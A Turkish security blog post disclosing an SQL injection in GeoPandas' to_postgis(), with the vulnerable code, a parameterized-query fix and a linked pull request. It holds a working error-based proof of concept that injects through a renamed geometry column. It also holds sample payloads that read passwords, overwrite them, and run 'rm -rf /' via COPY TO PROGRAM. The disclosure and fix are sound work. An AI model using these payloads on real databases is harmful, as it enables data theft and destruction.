---
layout: post
title: "SQL Injection Zafiyeti: GeoPandas to_postgis() Fonksiyonunda Güvenlik Açığı"
date: 2025-12-27
author: Yunus Aydın
lang: tr
description: "GeoPandas kütüphanesinin to_postgis() fonksiyonunda bulduğum SQL injection zafiyeti ve nasıl fix ettiğim. Parameterized queries ve güvenli SQL kullanımı."
keywords: "SQL injection, GeoPandas, to_postgis, PostgreSQL, security vulnerability, parameterized queries, security research, bug bounty"
canonical_url: "https://aydinnyunus.github.io/2025/12/27/sql-injection-geopandas-tr/"
---

Bir gün GeoPandas kütüphanesini kullanırken, `to_postgis()` fonksiyonunda bir şeylerin yanlış olduğunu fark ettim. Kullanıcı girdileri doğrudan SQL sorgularına ekleniyordu. Bu, klasik bir SQL injection zafiyetiydi. Zafiyeti bulduktan sonra fix'i de yazdım ve pull request açtım. Bu yazıda ne bulduğumu ve nasıl düzelttiğimi anlatacağım.

## SQL Injection Nedir?

SQL injection, kullanıcı girdilerinin doğrudan SQL sorgularına eklenmesiyle ortaya çıkan bir güvenlik zafiyetidir. Saldırgan, özel karakterler kullanarak veritabanı sorgularını manipüle edebilir.

Bu zafiyet neden tehlikeli? Çünkü:
- Veritabanındaki tüm verilere erişim sağlayabilir
- Veritabanı yapısını değiştirebilir
- Veri silebilir veya değiştirebilir
- PostgreSQL'de `COPY` komutu gibi sistem komutlarını çalıştırabilir

## Zafiyeti Nasıl Buldum?

GeoPandas'ın `to_postgis()` fonksiyonu, GeoDataFrame'leri PostgreSQL veritabanına yazmak için kullanılıyor. Fonksiyon, kullanıcıdan aldığı tablo adı ve schema adı gibi parametreleri doğrudan SQL sorgularına ekliyordu. Gerçek zafiyetli kod şöyleydi:

```python
# geopandas/io/sql.py:434
if connection.dialect.has_table(connection, name, schema):
    target_srid = connection.execute(
        text(f"SELECT Find_SRID('{schema_name}', '{name}', '{geom_name}');")
    ).fetchone()[0]
```

Sorun açık: `schema_name`, `name` ve `geom_name` değişkenleri doğrudan f-string içine ekleniyor. Bu, SQL injection saldırılarına açık.

### Attack Vector

Geometry column adı (`geom_name`), `gdf.rename_geometry()` fonksiyonu ile kullanıcı tarafından kontrol edilebiliyor ve doğrudan SQL sorgusuna parameterization olmadan ekleniyor.

## Nasıl Exploit Edilebilir?

SQL injection zafiyetini exploit etmek için, `geom_name` parametresini `rename_geometry()` ile manipüle edebiliriz. Error-based SQL injection tekniği kullanarak veritabanı bilgilerini çıkarabiliriz.

### Exploit Payload

```python
import geopandas as gpd
from shapely.geometry import Point
from sqlalchemy import create_engine
import re

# Malicious geometry column name
malicious_geom_name = "geom'); SELECT CAST(version() AS int); --"
gdf = gpd.GeoDataFrame(geometry=[Point(0, 0)], crs='EPSG:4326')
gdf = gdf.rename_geometry(malicious_geom_name)

try:
    gdf.to_postgis(name="test_table", con=engine, if_exists="append")
except Exception as e:
    # PostgreSQL error message'dan version bilgisini çıkar
    match = re.search(r':\s*"([^"]+)"', str(e))
    if match:
        print(f"✅ EXTRACTED PostgreSQL version: {match.group(1)}")
```

### Oluşan SQL Sorgusu

```sql
SELECT Find_SRID('public', 'test_table', 'geom'); SELECT CAST(version() AS int); --');
```

### Sonuç

PostgreSQL, `version()` fonksiyonunu integer'a cast etmeye çalışırken hata veriyor ve hata mesajında PostgreSQL versiyon bilgisi sızıyor:

```
✅ EXTRACTED PostgreSQL version: PostgreSQL 15.4 (Debian 15.4-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
```

**Hata Mesajı:**
```
invalid input syntax for type integer: "PostgreSQL 15.4..."
```

### Teknik Detaylar

**Exploit Tekniği:** Error-based SQL injection

1. String parametresinden çıkış: `geom');`
2. Yeni SQL statement enjekte et: `SELECT CAST(version() AS int);`
3. PostgreSQL hata mesajında version bilgisi sızıyor
4. Regex ile veri çıkar: `r':\s*"([^"]+)"'`

**Neden Çalışıyor:**
- `geom_name` üzerinde input validation yok
- F-string interpolation, parameterized queries yerine kullanılıyor
- PostgreSQL hata mesajları veri sızdırıyor

### Diğer Exploit Örnekleri

- Veri okuma: `"geom'); SELECT CAST((SELECT password FROM users LIMIT 1) AS int); --"`
- Veri değiştirme: `"geom'); UPDATE users SET password='hacked'; --"`
- Sistem komutları: `"geom'); COPY (SELECT 1) TO PROGRAM 'rm -rf /'; --"`

## Fix: Parameterized Queries

Zafiyeti fix etmek için, f-string interpolation yerine parameterized queries kullandım. Parameterized queries, kullanıcı girdilerini SQL sorgularından ayırarak, SQL injection saldırılarını önler.

### Zafiyetli Kod

```python
# VULNERABLE:
target_srid = connection.execute(
    text(f"SELECT Find_SRID('{schema_name}', '{name}', '{geom_name}');")
).fetchone()[0]
```

### Güvenli Kod

```python
# SECURE:
target_srid = connection.execute(
    text("SELECT Find_SRID(:schema_name, :name, :geom_name);").bindparams(
        schema_name=schema_name, 
        name=name, 
        geom_name=geom_name
    )
).fetchone()[0]
```

### Fix'in Avantajları

- SQL injection saldırılarını önler
- Kullanıcı girdilerini güvenli şekilde işler
- PostgreSQL'in parameterized query mekanizmasını kullanır
- Mevcut API'yi bozmadan güvenliği artırır

**Neden Çalışıyor:**
- Parameterized queries, kullanıcı girdilerini SQL sorgusundan tamamen ayırır
- PostgreSQL, parametreleri otomatik olarak escape eder
- SQL injection payload'ları artık çalışmaz

## Impact

- **Confidentiality:** YÜKSEK - Veritabanı bilgisi sızıntısı
- **Exploitability:** YÜKSEK - `rename_geometry()` ile kolayca exploit edilebilir
- **Real-World Risk:** Kullanıcı girdisi ile `to_postgis()` kullanan uygulamalar zafiyetli

## Proof of Concept

Tam çalışan exploit kodu:

```python
import geopandas as gpd
from shapely.geometry import Point
from sqlalchemy import create_engine
import re

# GeoDataFrame oluştur
gdf = gpd.GeoDataFrame(geometry=[Point(0, 0)], crs='EPSG:4326')

# Malicious geometry column name ile exploit
gdf = gdf.rename_geometry("geom'); SELECT CAST(version() AS int); --")

try:
    # to_postgis çağrısı SQL injection'ı tetikler
    gdf.to_postgis(name="test_table", con=engine, if_exists="append")
except Exception as e:
    # PostgreSQL error message'dan version bilgisini çıkar
    match = re.search(r':\s*"([^"]+)"', str(e))
    if match:
        print(f"✅ EXTRACTED PostgreSQL version: {match.group(1)}")
```

## Sonuç

SQL injection zafiyetleri, özellikle kullanıcı girdilerinin doğrudan SQL sorgularına eklenmesi durumunda çok tehlikeli olabilir. Bu zafiyeti bulmak ve fix etmek, GeoPandas kütüphanesinin güvenliğini önemli ölçüde artırdı.

Bu tür zafiyetleri bulmak ve fix etmek, açık kaynak kütüphanelerinin güvenliğini artırmak için kritiktir. Eğer benzer zafiyetler bulursanız, sorumlu açıklama (responsible disclosure) prensiplerine uyarak geliştirici ekibine bildirmenizi ve mümkünse fix'i de kendiniz yazmanızı öneriyorum.

**İlgili içerikler:**
- [CVE-2025-66019: pypdf Kütüphanesinde LZW Decompression DoS Zafiyeti](/2025/12/20/cve-2025-66019-pypdf-lzw-dos-tr/)
- [SSRF Zafiyeti: DNS Rebinding Saldırısı ile Bypass](/ssrf-dns-rebinding-vulnerability-tr/)

**Kaynaklar:**
- [GitHub PR: BUG: SQL Injection Exploit Report - GeoPandas to_postgis()](https://github.com/geopandas/geopandas/pull/3681)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PostgreSQL Identifier Quoting](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-IDENTIFIERS)

